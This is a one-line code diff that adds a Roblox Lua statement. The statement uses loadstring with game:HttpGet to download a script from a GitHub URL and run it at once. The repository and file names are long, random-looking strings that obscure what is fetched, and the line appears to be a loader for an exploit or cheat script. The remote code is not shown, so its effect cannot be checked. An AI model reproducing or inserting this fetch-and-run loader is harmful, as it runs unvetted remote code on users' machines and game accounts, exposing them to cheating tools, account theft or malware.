@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/botdevXD/SDJIFIJDFAKFWEKOSARFJIOWER34OJITIJO435JTOIOSDJIFIJDFAKFWEKOSARFJIOWER34OJITIJO435JTOIO/master/sfgjhdfjrgjbruhetghu4ergiijredgjjednfrgjkrejngr.lua", true))()
